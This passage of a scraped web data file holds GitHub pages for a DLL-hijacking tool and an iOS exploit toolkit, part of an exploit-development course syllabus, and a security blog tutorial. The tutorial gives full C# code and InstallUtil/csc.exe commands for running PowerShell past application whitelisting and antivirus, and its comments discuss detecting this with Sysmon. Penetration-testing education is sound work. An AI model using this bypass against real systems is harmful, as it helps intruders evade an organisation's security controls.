window.\n[29]Reload to refresh your session. (BUTTON) Dismiss alert\n(BUTTON)\n{{ message }}\n[30]knight0x07 \/ [31]ImpulsiveDLLHijack Public\n* [32]Notifications\n* [33]Fork 98\n* [34]Star 460 (BUTTON)\n*\nC# based tool which automates the process of discovering and exploiting\nDLL Hijacks in target binaries. The Hijacked paths discovered can later\nbe weaponized during Red Team Operations to evade EDR's.\n[35]460 stars [36]98 forks [37]Branches [38]Tags [39]Activity\n[40]Star (BUTTON)\n[41]Notifications\n* [42]Code\n* [43]Issues 1\n* [44]Pull requests 0\n* [45]Actions\n* [46]Projects 0\n* [47]Security\n* [48]Insights\n(BUTTON) Additional navigation options\n* [49]Code\n* [50]Issues\n* [51]Pull requests\n* [52]Actions\n* [53]Projects\n* [54]Security\n* [55]Insights\nknight0x07\/ImpulsiveDLLHijack\nThis commit does not belong to any branch on this repository, and may\nbelong to a fork outside of the repository.\nAbout\nC# based tool which automates the process of discovering and exploiting\nDLL Hijacks in target binaries. The Hijacked paths discovered can later\nbe weaponized during Red Team Operations to evade EDR's.\nTopics\n[56]cybersecurity [57]dll-hijacking [58]redteam [59]redteam-tools\nResources\n[60]Readme\n[61]Activity\nStars\n[62]460 stars\nWatchers\n[63]12 watching\nForks\n[64]98 forks\n[65]Report repository\n[66]Releases\nNo releases published\n[67]Packages 0\nNo packages published\nLanguages\n* [68]C# 89.0%\n* [69]C++ 8.9%\n* [70]C 2.1%\nFooter\n\u00a9 2024 GitHub, Inc.\nFooter navigation\n* [71]Terms\n* [72]Privacy\n* [73]Security\n* [74]Status\n* [75]Docs\n* [76]Contact\n* (BUTTON) Manage cookies\n* (BUTTON) Do not share my personal information\n(BUTTON) You can\u2019t perform that action at this time.\n(BUTTON)"}
{"text":"#[1]GitHub\n[2]Skip to content\n(BUTTON) Toggle navigation\n[3]Sign in\n(BUTTON)\n* (BUTTON) Product\n+ Actions\nAutomate any workflow\n+ Packages\nHost and manage packages\n+ Security\nFind and fix vulnerabilities\n+ Codespaces\nInstant dev environments\n+ Copilot\nWrite better code with AI\n+ Code review\nManage code changes\n+ Issues\nPlan and track work\n+ Discussions\nCollaborate outside of code\nExplore\n+ [4]All features\n+ [5]Documentation\n+ [6]GitHub Skills\n+ [7]Blog\n* (BUTTON) Solutions\nFor\n+ [8]Enterprise\n+ [9]Teams\n+ [10]Startups\n+ [11]Education\nBy Solution\n+ [12]CI\/CD & Automation\n+ [13]DevOps\n+ [14]DevSecOps\nResources\n+ [15]Learning Pathways\n+ [16]White papers, Ebooks, Webinars\n+ [17]Customer Stories\n+ [18]Partners\n* (BUTTON) Open Source\n+ GitHub Sponsors\nFund open source developers\n+ The ReadME Project\nGitHub community articles\nRepositories\n+ [19]Topics\n+ [20]Trending\n+ [21]Collections\n* [22]Pricing\n(BUTTON)\nSearch or jump to...\nSearch code, repositories, users, issues, pull requests...\nSearch\n____________________\nClear (BUTTON)\n[23]Search syntax tips\nProvide feedback\n(BUTTON)\nWe read every piece of feedback, and take your input very seriously.\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n[ ] Include my email address so I can be contacted\n(BUTTON) Cancel (BUTTON) Submit feedback\nSaved searches\nUse saved searches to filter your results more quickly\n(BUTTON)\nName ____________________\nQuery ____________________\nTo see all available qualifiers, see our [24]documentation.\n(BUTTON) Cancel (BUTTON) Create saved search\n[25]Sign in\n[26]Sign up\nYou signed in with another tab or window. [27]Reload to refresh your\nsession. You signed out in another tab or window. [28]Reload to refresh\nyour session. You switched accounts on another tab or window.\n[29]Reload to refresh your session. (BUTTON) Dismiss alert\n(BUTTON)\n{{ message }}\n[30]Soulghost \/ [31]iblessing Public\n* [32]Notifications\n* [33]Fork 86\n* [34]Star 600 (BUTTON)\n*\niblessing is an iOS security exploiting toolkit, it mainly includes\napplication information gathering, static analysis and dynamic\nanalysis. It can be used for reverse engineering, binary analysis and\nvulnerability mining.\nLicense\n[35]GPL-3.0 license\n[36]600 stars [37]86 forks [38]Branches [39]Tags [40]Activity\n[41]Star (BUTTON)\n[42]Notifications\n* [43]Code\n* [44]Issues 3\n* [45]Pull requests 0\n* [46]Actions\n* [47]Projects 0\n* [48]Wiki\n* [49]Security\n* [50]Insights\n(BUTTON) Additional navigation options\n* [51]Code\n* [52]Issues\n* [53]Pull requests\n* [54]Actions\n* [55]Projects\n* [56]Wiki\n* [57]Security\n* [58]Insights\nSoulghost\/iblessing\nThis commit does not belong to any branch on this repository, and may\nbelong to a fork outside of the repository.\nAbout\niblessing is an iOS security exploiting toolkit, it mainly includes\napplication information gathering, static analysis and dynamic\nanalysis. It can be used for reverse engineering, binary analysis and\nvulnerability mining.\nTopics\n[59]ios [60]exploit [61]scanner [62]reverse-engineering\n[63]vulnerability [64]vulnerability-scanners\nResources\n[65]Readme\nLicense\n[66]GPL-3.0 license\n[67]Activity\nStars\n[68]600 stars\nWatchers\n[69]23 watching\nForks\n[70]86 forks\n[71]Report repository\n[72]Releases\n[73]50 tags\n[74]Packages 0\nNo packages published\n[75]Contributors 2\n*\n*\nLanguages\n* [76]C++ 89.2%\n* [77]C 2.9%\n* [78]Objective-C 2.4%\n* [79]Objective-C++ 2.4%\n* [80]CMake 1.8%\n* [81]HTML 0.8%\n* [82]Shell 0.5%\nFooter\n\u00a9 2024 GitHub, Inc.\nFooter navigation\n* [83]Terms\n* [84]Privacy\n* [85]Security\n* [86]Status\n* [87]Docs\n* [88]Contact\n* (BUTTON) Manage cookies\n* (BUTTON) Do not share my personal information\n(BUTTON) You can\u2019t perform that action at this time.\n(BUTTON)"}
{"text":"#[1]Black Hills Information Security \u00bb iCal Feed [2]alternate\n[3]alternate [4]alternate [5]alternate\n[6]Black Hills Information Security\n[7]RSS\n* [8]About Us\n+ [9]Security Analysts\n+ [10]Admin\n+ [11]SOC\/HTOC Team\n+ [12]Partners\n+ [13]Interns\n+ [14]BHIS Tribe of Companies\n* [15]Contact\n+ [16]Contact Us\n+ [17]Email Sign-Up\n* [18]Services\n+ [19]Active SOC\n+ [20]ANTISOC\n+ [21]Blockchain Security\n+ [22]Blue Team Services\n+ [23]High-Profile Risk Assessments\n+ [24]Hunt Teaming (HTOC)\n+ [25]Incident Response\n+ [26]Penetration Testing\n* [27]Projects\/Tools\n+ [28]All Tools\n+ [29]RITA\n+ [30]Books\n+ [31]REKCAH\n* [32]Learn\n+ [33]Backdoors & Breaches\n+ [34]Blog\n+ [35]Conference\n+ [36]Podcasts\n+ [37]PROMPT# Zine\n+ [38]Upcoming Events\n+ [39]Webcasts\n* Community\n+ [40]Discord\n+ [41]LinkedIn\n+ [42]T-Shirts & Hoodies\n+ [43]Twitter\n+ [44]YouTube\n* [45]Training\n31 Aug 2016\n[46]Author, [47]Beau Bullock, [48]Brian Fehrman, [49]Red Team, [50]Red\nTeam Tools [51]how to bypass Anti Virus, [52]How to bypass AV, [53]How\nto bypass whitelisting, [54]PowerShell, [55]PowerShell without\nPowerShell, [56]What to do when PowerShell is banned\n[57]Powershell Without Powershell \u2013 How To Bypass Application Whitelisting,\nEnvironment Restrictions & AV\n[58]Brian Fehrman (With shout outs to: [59]Kelsey Bellew, [60]Beau\nBullock) \/\/\nIn a previous [61]blog post, we talked about bypassing AV and\nApplication Whitelisting by using a method developed by Casey Smith. In\na recent engagement, we ran into an environment with even more\nrestrictions in place. Not only did they have AV and Application\nWhitelisting, but they were also blocking the use of PowerShell and\ncmd.exe. We have run into a few instances where this was the case. More\nand more, companies are realizing that normal users don\u2019t need access\nto cmd.exe, PowerShell, or other cool tools. We feel that these are\nexcellent steps to take in securing an environment. Defenders must\nrealize, however, that there are potential ways around these\nrestrictions.\nIf you\u2019ve ever watched our [62]Sacred Cash Cow tipping series, you\u2019ve\nlikely seen the method that I developed for executing the\nInvoke-Shellcode.ps1 file from within a C# program. Essentially, you\nturn the Invoke-Shellcode.ps1 file into one, long, single-line and\nembed it as a string variable within the C# program. The result is a\nstand-alone executable that spawns a meterpreter shell and bypasses\nmost AV products. Teaser Alert: the full walkthrough for that will come\nin a future video blog-post.\nSo what does that have to do with this blog post? Well, we can extend\nthat concept to allow us to execute any PowerShell script within an\nenvironment that doesn\u2019t otherwise allow for PowerShell execution. How\ndoes it work? The magic is in the fact that both C# and PowerShell are\neffectively just frontends for the .NET framework. We are taking\nadvantage of the fact that we can use C# executables to directly call\nthe same .NET functionality that is accessed by PowerShell. If you\nwanted to, you could just write C# programs to do whatever your\nPowerShell scripts do\u2026but why go through all that work when you already\nhave the PowerShell scripts?\nEnough talk, let\u2019s do this! Create a new, blank text-file on your\nWindows Desktop and name it Program.cs. You can call it whatever you\nwant\u2026but that\u2019s just a suggestion. Open it up in an editor, such as\nNotePad++. First, we need to import some functionality by adding the\nfollowing using statements to the top of the file:\nusing System;\nusing System.Configuration.Install;\nusing System.Runtime.InteropServices;\nusing System.Management.Automation.Runspaces;\nIn order for our program to compile properly, we need to define a class\nthat contains a method named Main(). Typically, this would be the main\nentry point into our program. We will call our class the same name as\nour Program.cs file. Add the following lines to the end of your\nProgram.cs file:\npublic class Program\n{\npublic static void Main()\n{\n}\n}\nThe next step is to define the true entry point for our program. We\nwill be using the InstallUtil.exe utility to run our program rather\nthan executing it directly. This is the wizardry that can allow us to\nbypass application-whitelisting restrictions. In order to do this, we\ndefine a class named Sample that inherits from the Installer class. We\nthen declare a method named Uninstall, which will be the true entry\npoint to our program. In this case, the first task our program will\nperform will be to call a method named Exec that is part of a class\nnamed Mycode. We also add a statement above the class declaration to\nsay that this method is expected to be run as part of an installation\nprocess. Add the following lines to the bottom of your Program.cs file:\n[System.ComponentModel.RunInstaller(true)]\npublic class Sample : System.Configuration.Install.Installer\n{\npublic override void Uninstall(System.Collections.IDictionary savedState)\n{\nMycode.Exec();\n}\n}\nThe final piece to our program is to define the Mycode class and a\nmethod named Exec. The method reads in a PowerShell script that is\nlocated at the path that is defined in the @\u201d \u201c notation. In this case,\nmy PowerShell script is located at C:\\Users\\fmc\\Desktop\\PowerUp.ps1.\nThe lines that follow this are used to set up variables and parameters\nthat are needed in order to execute the PowerShell script. Finally, the\nPowerShell script is executed with the pipeline.Invoke() call. Add the\nfollowing lines to the end of your Program.cs file:\npublic class Mycode\n{\npublic static void Exec()\n{\nstring command = System.IO.File.ReadAllText(@\"C:\\Users\\fmc\\Desktop\\PowerUp.ps1\"\n);\nRunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();\nRunspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);\nrspace.Open();\nPipeline pipeline = rspace.CreatePipeline();\npipeline.Commands.AddScript(command);\npipeline.Invoke();\n}\n}\nThe entire Program.cs file should look as follows:\nusing System;\nusing System.Configuration.Install;\nusing System.Runtime.InteropServices;\nusing System.Management.Automation.Runspaces;\npublic class Program\n{\npublic static void Main()\n{\n}\n}\n[System.ComponentModel.RunInstaller(true)]\npublic class Sample : System.Configuration.Install.Installer\n{\npublic override void Uninstall(System.Collections.IDictionary savedState)\n{\nMycode.Exec();\n}\n}\npublic class Mycode\n{\npublic static void Exec()\n{\nstring command = System.IO.File.ReadAllText(@\"C:\\Users\\fmc\\Desktop\\PowerUp.ps1\"\n);\nRunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();\nRunspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);\nrspace.Open();\nPipeline pipeline = rspace.CreatePipeline();\npipeline.Commands.AddScript(command);\npipeline.Invoke();\n}\n}\nIn this example, I am using Veil-Framework\u2019s PowerUp script.\nPreviously, you\u2019d run the script from within a PowerShell prompt and\noutput the results to a file by doing something like the following:\nImport-Module PowerUp.ps1\nInvoke-AllChecks -Verbose | Out-File C:\\Users\\fmc\\Desktop\\allchecks.txt\nIn order for the function to be called with this method, we need to add\nan explicit function call to the end of the script. Open up the\nPowerUp.ps1 script and add the function call to the very bottom of the\nfile. Make sure to name your Out-File parameter to suit your\nenvironment. Save the script and exit.\nInvoke-AllChecks -Verbose | Out-File C:\\Users\\fmc\\Desktop\\allchecks.txt\nNow we need to compile our program. We are going to use the csc.exe\nutility to perform the compilation. We have to pass in a couple of\nflags in order for the program to properly compile. The following\ncommand can be used to compile the Program.cs file and generate an\nexecutable named powerup.exe:\nC:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc.exe\n\/r:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__\n31bf3856ad364e35\\System.Management.Automation.dll \/unsafe \/platform:anycpu\n\/out:C:\\Users\\fmc\\Desktop\\powerup.exe C:\\Users\\fmc\\Desktop\\Program.cs\nBut\u2026wait\u2026what if cmd.exe is locked down? No worries. Open File Explorer\nand navigate to:\nC:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\\nRight-click on the csc.exe file and choose Create shortcut. You will\nget a message saying that you can\u2019t create a shortcut there and it will\nprompt you to create one on your desktop. Just click yes.\nNow, head to your desktop. Right-click the csc.exe shortcut and choose\nProperties.\nClick on the Shortcut tab, select all of the text in the Target field,\nand then replace it with the following text (making sure to replace\nC:\\Users\\fmc\\Desktop\\powerup.exe with a filename that will match your\nenvironment):\nC:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc.exe\n\/r:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__\n31bf3856ad364e35\\System.Management.Automation.dll \/unsafe \/platform:anycpu\n\/out:C:\\Users\\fmc\\Desktop\\powerup.exe\nThen, click Apply and close the Properties window. What we\u2019ve done here\nare specified parameters to pass into csc.exe when we use this shortcut\nto execute it. The Program.cs path is purposefully left off for two\nreasons. The main reason is that the Target field has a maximum\ncharacter limit and adding in the full path to your Program.cs file\nwill likely exceed this limit. The full path to the Program.cs file\nwill automatically be passed as an argument to the csc.exe program\nduring the upcoming drag-and-drop step of this tutorial.\nTo compile your Program.cs file, simply drag and drop the Program.cs\nfile onto the csc.exe shortcut icon on your desktop. If everything went\nwell, you should get a powerup.exe file on your desktop. Congrats, you\njust compiled a CSharp program without using the command line or Visual\nStudio!\nFinally, we need to run our program by using the InstallUtil.exe\nutility. This process will be similar to how we used the csc.exe\napplication. Navigate back to:\nC:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\\nRight-click on the InstallUtil.exe file and choose Create shortcut. You\nwill get a message saying that you can\u2019t create a shortcut there and it\nwill prompt you to create one on your desktop. Just click yes.\nHead to your Desktop, right-click on the InstallUtil shortcut and click\nProperties.\nUnder the Shortcut tab, delete everything in the Target field and\nreplace with the following (making sure to change the log file name to\nmatch your environment):\nC:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\InstallUtil.exe\n\/logfile=C:\\Users\\fmc\\Desktop\\log.txt \/LogToConsole=false \/U\nClick Apply and then close the properties window.\nNow, head back to your Desktop if you\u2019re not already there. Drag the\npowerup.exe file onto the InstallUtil shortcut file.\nYou should see a command prompt pop up while the script executes. If\nyou open Task Manager, however, you\u2019ll notice that cmd.exe isn\u2019t in the\nprocess list; only InstallUtil.exe.\nWe can confirm this by running the following from a Windows command\nprompt right after we drag the powerup.exe file onto the InstallUtil\nshortcut:\nwmic process list full > Desktop\\save.txt\nFrom inspecting the output of the wmic command, we find that\nInstallUtil.exe was actually called via explorer.exe and not cmd.exe.\nSweet!\nOnce the script finishes executing, you should find the allchecks.txt\nfile on your desktop. Open the allchecks.txt file to inspect the output\nfrom the PowerUp.ps1 Invoke-AllChecks method.\nThere you have it. We have a method to execute PowerShell scripts in\nenvironments that have application whitelisting enabled and have\ndisabled access to powershell.exe and cmd.exe. You can run virtually\nany PowerShell script that you want to with this. Just a few items to\nnote though:\n* Make sure your script doesn\u2019t use Write-Host\n* This will cause the program to crash\n* Use Write-Output or Out-File instead\n* If your script prompts for user input, use the -Force option when\nyou insert the function call at the bottom of your PowerShell\nscript\n* There may be other characters and functions that cause issues for\nthis method. Please let me know if you run into any and we can try\nto get it sorted out.\nThis method can also be used to bypass AV. We will give a walkthrough\nof that process in an upcoming video segment!\n__________________________________________________________________\n__________________________________________________________________\nReady to learn more?\nLevel up your skills with affordable classes from Antisyphon!\n[63]Pay-What-You-Can Training\nAvailable live\/virtual and on-demand\n__________________________________________________________________\n__________________________________________________________________\n[64]Reminders \u2013 Simple Security and Finding Sanity In the Digital\nAge[65] Lawrence\u2019s List 090216\n9 Comments\n1. Gyz\nSeptember 2, 2016 @ 1:46 am\nVery Cool trick , thanks!\n2. Esva\nSeptember 7, 2016 @ 4:16 am\nVery interesting article. Thanks\nOne question, what if the csc.exe is blocked under group policy.\nAny way to work around?\n3. Brian Fehrman (fullmetalcache)\nSeptember 7, 2016 @ 1:28 pm\nEsva, we will be looking into that next =)\n4. BJ\nSeptember 13, 2016 @ 2:33 pm\nDo the Event Logs show the PS script had run? If auditing were\nproperly setup, would this trigger an alert in a SIEM? I\u2019m sure\ncompanies who disable PS don\u2019t bother to monitor the PS events.\n5. [66]Justin Henderson\nMarch 9, 2017 @ 9:12 pm\nUnfortunately PowerShell logging will not work when PowerShell is\nused this way. However, you can catch it by using any product that\nmonitors DLL image loading. A free way to do this is with Microsoft\nSysinternals Sysmon. A low log configuration section specific to\nthis can be found below:\nSysmon.exe\nMicrosoft Windows\nMicrosoft Corporation\nSystem.Management.Automation\nSystem.Management.Automation.ni\nSystem.Reflection\nlsass.exe\nC:\\Users\nSystem.Management.Automation\nSystem.Management.Automation\nSystem.Reflection.Dll\nThis will generate an event with an Event ID of 7 that can catch\nthis type of activity.\n+ [67]Brian Fehrman (fullmetalcache)\nMarch 10, 2017 @ 1:47 pm\nHey Justin,\nThanks for the info!\nIt appears that installing and running sysmon requires that\nyou disable Windows from enforcing it\u2019s digitally-signed\ndriver policy. Is that correct?\nOne thing that I have been wondering about, and that this has\nencouraged me to investigate, is what it looks like if I embed\nthe DLL as part of the C# binary. I imagine System.Reflection\nwill still show up but that isn\u2019t necessarily malicious\nactivity. I\u2019m curious if System.Management.Automation will\nstill show. I am looking into this now and will report back.\nThanks Justin!\n6. [68]Justin Henderson\nMarch 10, 2017 @ 2:06 pm\nLooks like my Sysmon config file syntax got stripped off the\ncomment. If you want that email me at:\nJhenderson at tekrefresh.com\nAs to your questions about Sysmon requiring Windows to disable its\ndigitally-signed drive policy it shouldn\u2019t. I was pretty sure the\nSysmon drivers are signed by the Microsoft Corporation since they\nare from Sysinternals. I\u2019m running Sysmon v6 on Windows 10 x64\nwhich enforces digitally-signed drivers.\nAlso, I would guess if you embed the DLL as part of a C# binary it\nwill still be caught by Sysmon. While this would technically be a\nfalse positive you could simply push an update to Sysmon to exclude\nthat specific file, process name, or digital signature if you sign\nyou programs.\n7. [69]Brian Fehrman (fullmetalcache)\nMarch 10, 2017 @ 3:09 pm\nHaha, no worries. I figured that\u2019s what happened and found a sample\nconfig online.\nFor some reason, my Windows 7 VM is throwing a fit about Sysmon. I\ngot it installed though so that I can at least run my test.\nChecking it out now and I will get back ASAP.\n8. [70]Tim Pierson\nApril 4, 2017 @ 5:47 pm\nWow how very clever!\nI have a nice little utility I wrote in Powershell and it kind of\nmushroomed on me. Meaning it has grown into a full blow\napplication. Now the company wants me to distribute it but I am\nconcerned about giving away my code. I know that you can compile\npowershell into an .EXE file but I have no idea how secure that is.\nI have been told that all the compiler does is create a C# runtime\nand then run the powershell script in it. I assume that is one of\nthe reasons that powershell must be installed to still make the\n.exe run. My question is how hard would it be for someone to\nextract the .ps1 script from the .EXE file? I need to do something\nto make it difficult to steal my code. Can you give me any ideas? I\nwas curious about your method here\u2026\nAlso would your method make the complied powershell run any faster\nas well?\nThanks in advance for your help\u2026\n[71]Back to top\n[72]Black Hills Information Security\n890 Lazelle Street, Sturgis, SD 57785-1611 | 701-484-BHIS (2447)\n\u00a9 2008-2023\n[73]About Us | [74]BHIS Tribe of Companies | [75]Privacy Policy |\n[76]Contact\nLinks\n*\n*\n*\n*\n*\n*\nSearch the site ____________________\nLight Dark"}
{"text":"CNIT 127: Exploit Development\n76488 Mon 6:10 - 9:00 PM SCIE 37\nFall 2015 Sam Bowne\n[1]Schedule \u00b7 [2]Lecture Notes \u00b7 [3]Projects \u00b7 [4]Links \u00b7 [5]Home Page\n[6]Scores\n[7]Open Lab Hours for Sci 214\n[8][sh-cover.png]\nCatalog Description\nLearn how to find vulnerabilities and exploit them to gain control of\ntarget systems, including Linux, Windows, Mac, and Cisco. This class\ncovers how to write tools, not just how to use them; essential skills\nfor advanced penetration testers and software security professionals.\nAdvisory: CS 110A or equivalent familiarity with programming\nUpon successful completion of this course, the student will be able to:\nA. Read and write basic assembly code routines\nB. Read and write basic C programs\nC. Recognize C constructs in assembly\nD. Find stack overflow vulnerabilities and exploit them\nE. Create local privilege escalation exploits\nF. Understand Linux shellcode and be able to write your own\nG. Understand format string vulnerabilities and exploit them\nH. Understand heap overflows and exploit them\nI. Explain essential Windows features and their weaknesses, including\nDCOM and DCE-RPC\nJ. Understand Windows shells and how to write them\nK. Explain various Windows overflows and exploit them\nL. Evade filters and other Windows defenses\nM. Find vulnerabilities in Mac OS X and exploit them\nN. Find vulnerabilities in Cisco IOS and exploit them\nStudent Learning Outcomes (measured to guide course improvements)\n1. Read and write basic assembly code routines\n2. Find stack overflow vulnerabilities and exploit them\n3. Evade filters and other Windows defenses\nTextbook\n\"The Shellcoder's Handbook: Discovering and Exploiting Security Holes\n\", by Chris Anley, John Heasman, Felix Lindner, Gerardo Richarte; ASIN:\nB004P5O38Q [9]Buy from Amazon\n__________________________________________________________________\nSchedule (may be revised)\nDate Quiz Topic\nMon 8-17   Ch 1: Before you Begin\nMon 8-24   Ch 2: Stack overflows on Linux\nMon 8-31   Ch 3: Shellcode\nFri 9-4 Last Day to Add Classes\nMon 9-7 Holiday - No Class\nMon 9-14 Quiz: Ch 1-3\nProj 1-3 due Ch 4: Introduction to format string bugs\nMon 9-21 No Quiz\nProj 4 due Ch 5: Introduction to heap overflows\nMon 9-28 Quiz: Ch 4 & 5\nProj 5-6 due Ch 6: The Wild World of Windows (Part 1)\nMon 10-5 No Quiz\nProj 7 due Ch 6: The Wild World of Windows (Part 2)\nMon 10-12 Quiz: Ch 6\nProj 8-9 due Ch 7: Windows Shellcode\nMon 10-19 No Quiz\nProj 10 due Ch 8: Windows overflows (Part 1)\n________________________________________________________\nMon 10-26 No Quiz\nNo Proj Due\nGuest Speaker: Michael Coates\nOWASP Global Board\n[10]Bay Area AppSec Mentorship Program    [MichaelCoates.jpg]\n________________________________________________________\nMon 10-26 Mid-Term Grades Due\nMon 11-2 No Quiz\nProj 11-12 due Ch 8: Windows overflows (Part 2)\nMon 11-9 Quiz: Lec. 7 & Ch 8\nProj 13 due Ch 14: Protection Mechanisms\nThu 11-12 Last Day to Withdraw\nMon 11-16 No Quiz\nProj 14-15 due Ch 16: Fault Injection\nCh 17: The Art of Fuzzing\nCh 18: Source Code Auditing\nMon 11-23 Quiz on Ch 14\nProj 16 due Hopper Debugger\nMon 11-30 No Quiz\nNo proj due Preview of new course \"Securing Web Applications\" and two\nmore servers to hack\nMon 12-7 No Quiz\nProj 17-18 due\nAll Extra Credit Projects Due  Last Class: TBA (Class will meet: the\nstrike was cancelled)\nMon 12-14   Final Exam\n__________________________________________________________________\nLectures\n[11]Policy\nIntroduction to Exploitation: Linux on x86\n[12]Ch 1: Before you Begin (pptx)\n[13]Ch 2: Stack overflows on Linux (pptx)\n[14]Ch 3: Shellcode (pptx)\n[15]Ch 4: Introduction to format string bugs (pptx)\n[16]Ch 5: Introduction to heap overflows (pptx)\nWindows\n[17]Ch 6: The Wild World of Windows (pptx)\n[18]Lecture 7: Intro to 64-Bit Assembler (pptx)\nWe'll skip Ch 7: Windows shellcode\n[19]Ch 8: Windows overflows (Part 1)\n[20]Ch 8: Windows overflows (Part 2)\nWe'll skip chapters 9 through 13\n[21]Ch 14: Protection Mechanisms (pptx)\nWe'll skip chapter 15\n[22]Ch 16: Fault Injection\nCh 17: The Art of Fuzzing\nCh 18: Source Code Auditing (pptx)\n[23]Exploiting Windows: Introduction\n[24]Buffer Overflow Defenses\nThe lectures are in PowerPoint formats\nIf you do not have PowerPoint you can use [25]Open Office.\n[26]Back to Top\n__________________________________________________________________\nProjects\n[27]Downloading the Virtual Machines\n[28]Proj 1: Using Jasmin to run x86 Assembly Code (15 pts.)\nIf you don't want the drawing of a partially undressed woman on the\nsplash screen, use this version of Jasmin:\n[29]Download politically correct Jasmin without the cheescake\nNote: I now recommend using Kali 2.0 for the projects.\n[30]Tips for Kali 2\n[31]Proj 1 (must renumber later): Linux Buffer Overflow With Command\nInjection\n[32]Proj 2: Linux Buffer Overflow Without Shellcode (20 pts.)\n[33]Proj 3: Linux Buffer Overflow With Shellcode (20 pts.)\n[34]Proj 4: Remote Linux Buffer Overflow With Listening Shell (20 pts.)\n[35]Proj 5: Using nasm, ld, and objdump (10 pts.)\n[36]Proj 6: Exploiting a Format String Vulnerability (20 pts.)\n[37]Proj 7: Very Simple Heap Overflow (10 pts.)\n[38]Proj 8: Heap Overflow via Data Overwrite (10 pts.)\n[39]Proj 9: Exploiting \"Vulnerable Server\" on Windows (25 pts.)\n[40]Proj 10: Exploiting Easy RM to MP3 Converter on Windows with ASLR\n(20 pts.)\n[41]Proj 11: Defeating DEP with ROP (20 pts.)\n[42]Proj 12: Intro to 64-bit Assembler (15 pts.)\n[43]Proj 13: 64-Bit Buffer Overflow Exploit (15 pts.)\n[44]Proj 14: Heap Spray (15 pts.)\n[45]Proj 15: SEH-Based Stack Overflow Exploit (25 pts.)\n[46]Proj 16: Fuzzing with the Failure Observation Engine (20 pts.)\n[47]Proj 17: Security Shepherd (20 pts.)\n[48]Proj 18: Fuzzing with Spike (15 pts.)\nExtra Credit Projects\n[49]Proj 1x: Assembly Code Challenges (30 points)\n[50]Proj 2x: Linux Buffer Overflow Without Shellcode Challenges (25\npts.)\n[51]Proj 3x: Embedded Security CTF (Up to 25 pts.)\n[52]Proj 4x: Linux Buffer Overflow With Shellcode Challenges (30 pts.)\n[53]Proj 5x: Linux Buffer Overflow With Canary (25 pts.)\n[54]Proj 6x: Remote Shell via Format String Exploit (20 pts.)\n[55]Proj 7x: Introduction to Hopper (20 pts.)\n[56]Proj 8x: Remote Shell via Heap Exploit (20 pts.)\n[57]Proj 9x: Understanding PE Files and ASLR on Windows (15 pts.)\n[58]Proj 12x: 64-bit Assembler Challenges (25 pts.)\n[59]Proj 13x: 64-Bit Remote Buffer Overflow with ASLR (25 pts.)\n[60]Proj 17x: Security Shepherd Challenges (Up to 40 pts.)\n[61]Proj 19x: Source Code Analysis with cppcheck (10 pts.)\n[62]Proj 21x: PicoCTF (Up to 40 pts.)\n[63]Proj 22x: Student Presentation (Usually 15 pts.)\nProjects Still Undergoing Revision\n[64]Windows Server 2012 Buffer Overflow Defenses and EMET\n[65]Fuzzing \"Vulnerable Server\"\nCultural Enrichment\n[66]How to view someones IP address and connection speed with TRACER T!\n- YouTube\n[67]I Pwned Your Server - YouTube\n[68]Back to Top\n__________________________________________________________________\nLinks\nLinks for Chapter Lectures\n[69]Ch 1a: Anatomy of a Program in Memory - Excellent explanation from\n2009\n[70]Ch 1b: assembly - difference between 'or eax,eax' and 'test\neax,eax'\n[71]Ch 2a: Smashing the Stack for Fun and Profit by Aleph One\n[72]Ch 2b: Assembly Programming Tutorial\n[73]Ch 2c: GDB Command Reference - set disassembly-flavor command\n[74]Ch 2d: GDB Tutorial\n[75]Ch 3b: What's the difference of the Userland vs the Kernel?\n[76]Ch 3c: Protection ring - Wikipedia\n[77]Ch 3d: The GNU C Library: glibc\n[78]Ch 3e: linux - What is the difference between exit() and\nexit_group()\n[79]Ch 3f: Two excellent syscall examples with explanations\n[80]Ch 3g: c - Linux system call table or cheetsheet in assembly\nlanguage - Stack Overflow\n[81]Ch 3h: NASM Tutorial\n[82]Ch 3i: Shellcode in C - What does this mean? - Stack Overflow\n[83]Ch 3k: C code to test shellcode, simpler than that in the textbook\n[84]Ch 3l: execve(2): execute program - Linux man page\n[85]Ch 3m: Linux Syscall Reference\n[86]Ch 3n: Ways to do syscall: INT 0x80 and call *%gs:0x10 explained\n[87]Ch 4a: Format String Exploitation-Tutorial By Saif El-Sherel\n(updated 1-25-18, ty B Meixell)\n[88]Ch 4b: Exploiting Format String Vulnerabilities (from 2001)\n[89]Ch 4c: Advanced Format String Attacks (Paul Haas, Slides from DEF\nCON 18)\n[90]Ch 4d: Advanced Format String Attacks with demo videos\n[91]Ch 4e: Defcon 18 - Advanced format string attacks Paul Haas -\nYouTube\n[92]Ch 4f: Introduction to format string exploits -- with helpful gdb\ntips\n[93]Ch 4g: Ace Stream Media Format String Vulnerability (from 2014)\n[94]Ch 4h: Cisco Email Security Appliance Format String Vulnerability\n(9-9-2015)\n[95]Ch 4i: Graphviz Remote Format String Vulnerability, affects Ubuntu\n(from 2014)\n[96]Ch 4j: Polycom - H.323 Format String Vulnerability (from 2013)\n[97]Ch 4k: Python RRDtool Module Function Format String Vulnerability\n(from 2013)\n[98]Ch 4l: Broadcom UPnP Stack Format String Vulnerability (from 2013)\n[99]Ch 4m: pidgin-otr log_message_cb() Function Format String\nVulnerability (from 2012)\n[100]Ch 4n: atexit(3) - Linux man page\n[101]Ch 4o: GOT and PLT for pwning\n[102]Ch 4p: PLT and GOT - the key to code sharing and dynamic libraries\n[103]Ch 5a: A Memory Allocator by Doug Lea\n[104]Ch 5b: Understanding the Heap & Exploiting Heap Overflows\n[105]Ch 5c: Several Interesting Heap Overflow Example Programs\n[106]Ch 5d: Four Excellent Heap Overflow Exercises (updated 1-25-18, ty\nB Meixell)\n[107]Ch 5e: Wonderful Exploit Exercises including VMs and heap\noverflows\n[108]Ch 5f: Dangling Pointer paper from Black Hat 2007\n[109]Ch 5g: Working example of a \"Dangling Pointers\" 